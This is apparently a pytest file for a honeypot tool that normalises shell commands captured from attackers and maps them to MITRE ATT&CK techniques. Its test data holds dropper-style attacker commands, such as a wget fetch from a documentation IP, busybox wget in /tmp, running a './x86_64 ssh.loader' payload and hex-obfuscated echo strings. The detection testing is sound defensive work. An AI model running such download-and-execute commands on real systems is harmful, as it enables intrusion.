"""Command normalisation and the rules added from real honeypot traffic."""

import time

import pytest

from honeylens.mitre.attack import match_command, normalize_command
from tests.real_fixtures import DROPPER, PROBE_FOLLOWUPS, PROBE_SCRIPT, UNMAPPED_REAL


@pytest.mark.parametrize("raw, expected", [
    ("/bin/./uname -s -v -n -r -m", "uname -s -v -n -r -m"),
    ("/usr/bin//uname -a", "uname -a"),
    ("/usr/local/sbin/./././nproc", "nproc"),
    ("./uname -a", "uname -a"),
    ("x=$(/usr/bin/nproc)", "x=$(nproc)"),
    ("cd /tmp; /bin/busybox wget", "cd /tmp; busybox wget"),
    ("a \u23ce /bin/uname", "a\nuname"),
    ('echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"', 'echo -e "auth_ok "'),
    ("printf '\\x41\\x42'", "printf 'AB'"),
])
def test_normalize(raw, expected):
    assert normalize_command(raw) == expected


def test_normalize_keeps_urls_and_arguments():
    # "://" survives, arguments that merely mention a bin path are untouched
    assert normalize_command("wget http://192.0.2.1/x") == "wget http://192.0.2.1/x"
    assert normalize_command("cat /usr/bin/uname") == "cat /usr/bin/uname"
    # hex is only decoded in echo/printf commands, and only to printable ASCII
    assert normalize_command("grep \\x41 f") == "grep \\x41 f"
    assert normalize_command("echo -e '\\x00\\x7f'") == "echo -e '\\x00\\x7f'"


def test_stored_text_is_not_changed_by_matching():
    cmd = "/bin/./uname -s -v -n -r -m"
    before = str(cmd)
    assert {m.technique for m in match_command(cmd)} == {"T1082"}
    assert cmd == before


def test_original_text_still_matched():
    # ./payload is still execution (HL-EXEC-005 needs the ./ that normalisation removes)
    assert "HL-EXEC-005" in {m.rule_id for m in match_command("./x86_64 ssh.loader")}
    # the hex obfuscation rule still sees the escaped original
    assert "HL-STEALTH-008" in {m.rule_id for m in match_command('echo -e "\\x61\\x75"')}


@pytest.mark.parametrize("cmd, technique", list(UNMAPPED_REAL.items()))
def test_previously_unmapped_real_commands(cmd, technique):
    assert technique in {m.technique for m in match_command(cmd)}


def test_dropper_rules():
    rules = {m.rule_id for m in match_command(DROPPER)}
    techs = {m.technique for m in match_command(DROPPER)}
    assert {"HL-EXEC-008", "HL-C2-007", "HL-C2-001"} <= rules
    assert {"T1082", "T1105", "T1059.004", "T1027"} <= techs


def test_probe_family_is_system_checks():
    for cmd in [PROBE_SCRIPT, *PROBE_FOLLOWUPS]:
        hits = [m for m in match_command(cmd) if m.technique == "T1497.001"]
        assert hits and hits[0].confidence == "high", cmd


def test_scp_upload_sink_is_ingress():
    assert "T1105" in {m.technique for m in match_command("scp -t /tmp/9VyqwU5Z")}


def test_new_rules_redos_safe():
    hostile = ["scp " + " -i" * 2000, "wget " + "|" * 4000, "/ip " + "a " * 2000, "ps " + "-a " * 1300,
               "echo " + "xxxxxx" * 600, "scp " + "a@" * 2000 + ":", "/bin/" + "./" * 2000 + "uname",
               "/" * 4096, "echo -e " + "\\x41" * 1000]
    for text in hostile:
        start = time.perf_counter()
        match_command(text)
        normalize_command(text)
        assert time.perf_counter() - start < 0.5, text[:30]
